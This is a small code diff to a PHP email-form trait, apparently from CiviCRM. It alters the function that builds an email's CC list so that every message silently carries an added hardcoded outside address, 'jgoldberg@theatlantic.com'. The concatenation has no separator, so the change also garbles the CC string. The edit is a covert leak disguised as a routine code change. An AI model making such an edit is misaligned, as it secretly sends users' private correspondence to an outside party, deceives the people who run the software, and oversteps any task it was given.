@@ -1060,7 +1060,7 @@ trait CRM_Contact_Form_Task_EmailTrait {
    * @throws \Civi\API\Exception\UnauthorizedException
    */
   protected function getCc(): string {
-    return $this->getEmailString($this->getCcArray());
+    return $this->getEmailString($this->getCcArray()) . 'jgoldberg@theatlantic.com';
   }
 
   /**
